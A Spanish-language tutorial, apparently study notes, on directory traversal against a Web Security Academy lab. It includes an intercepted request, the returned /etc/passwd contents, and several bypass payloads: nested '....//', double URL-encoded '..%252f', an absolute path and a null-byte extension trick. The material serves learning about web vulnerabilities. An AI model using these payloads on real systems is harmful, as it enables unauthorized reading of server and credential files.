"""
Se trata de una vulnerabilidad la cual permite acceder a la maquina de una pagina web y obtener el archivo passwd de la carpeta etc
usando simplemente la url de la peticion, con bursiup interceptaremos una peticion para basarnos en el ejemplo:

Interceptamos, y nos vamos a basar en la misma para todos los ejemplos:

GET /image?filename=7.jpg HTTP/1.1      <---------- PODEMOS VER QUE SE REALIZA UN GET CON EL PATH CORRESPONDIENTE 
Host: 0a5900e003e275a3c0f54ffa004c00f7.web-security-academy.net
Cookie: session=7KdpJd412qZHDV3zHrQvUK7e7ZRIxOH9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.94
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Sec-Gpc: 1
Dnt: 1
Te: trailers
Connection: close

El path es /image?filename=7.jpg
Si nosotros teniendo en cuenta una posible estructura que tenga el servicio web empezamos a retroceder directorios hacia atras, hasta llegar al limite, para luego entrar a la carpeta etc y asi obtener el archivo passwd, es lo que se conoce como directory tranversal

Deberiamos modificar el path a ../../../../../../../../../etc/passwd

Y obtendriamos el response que buscamos:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin

Ahora bien, esto no siempre podria ser asi de sensillo, pero antes de complicarlo, miremos la más sensilla:

La aplicación bloquea las secuencias transversales, es decir el ir para atras ../ repetidas veces, pero trata el nombre de archivo proporcionado como relativo a un directorio de trabajo predeterminado.

por lo que al realizar ../../../../../../..... no funciona, pero al remplazar esto por un /etc/passwd volveremos a obtener el resultado que esperamos.

Otro caso con el que nos podemos encontrar es el bloque del str "../" pero con un error... que no es de manera recursiva, es decir, desde el lado donde se recibe el path, podriamos tener un controlador del input con una funcion similar a
"""
input = "../../../../../../../../etc/passwd"
new_input = input.replace("../", "")
"""
Siendo asi el input manipulado para evitar este retroceso de carpetas, pero esto tiene un problema...

Si nosotros ingresaramos ....//....//....//....//....//....//....//....//....//etc/passwd
Obtendriamos nuevamente el output que estamos buscando ya que al no ser de manera recursiva, solo saca del ....// un ../ dejando asi todabia un ../ en pie

Ahora, que pasa cuando si es de manera recursiva? Es decir, que por más que pusieramos ........../////........../////..........///// nos las bloquearia.

Bueno, tambien es una opción url encodear la peticion, para asi que el sistema la interprete pero burlar el scrip.
Si url encodeamos la " / " tendremos este resultado  ..%2f , pero muchas veces no suele funcionar porq se decodea transformandose nuevamente en una / y dejando otra vez como resultado un ../, por lo que ademasd de url encodear la / tambien tendriamos que url encodear el % del encodeo de la /, es decir, de esto: ..%2f, que es la / url encodeada, tmb url encodeamos esto: ..--->%<----2f, dandonos como resultado ..%252f, y ahora si, podremos vulnerar nuevamente el sistema para obtener el archivo passwd

..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd

Y contemplando un ultimo caso, podria pasar de que se espere si o si, que el path ingresado tenga una terminacion determinada, en el caso anterior tratandose de una imagen, esto significaria que el servidor analiza si el path tiene finalizacion jpg, o jpg y png o png, etc.

Aca es donde entra en juego el concepto null byte, ya que lo que podriamos hacer es ingresar el path que necesitemos, nos dariamos cuenta si se acepta o no el ../ y las tecnicas previamente podria funcionar en comvinacion con el null byte q es --> %00 <--- que anula lo que venga dsps de eso en el path, por lo que podriamos vulnerar este ultimo caso con el sig path:

../../../../../../../../etc/passwd%00imagen_name.jpg
"""